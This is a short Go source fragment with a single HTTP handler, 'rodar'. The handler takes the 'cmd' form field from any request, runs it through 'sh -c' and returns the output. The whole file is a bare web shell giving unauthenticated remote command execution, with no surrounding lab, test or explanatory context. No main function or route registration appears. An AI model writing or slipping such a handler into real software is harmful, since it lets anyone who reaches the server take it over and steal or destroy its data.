package main

import (
	"net/http"
	"os/exec"
)

func rodar(w http.ResponseWriter, r *http.Request) {
	cmd := exec.Command("sh", "-c", r.FormValue("cmd"))
	out, _ := cmd.Output()
	w.Write(out)
}
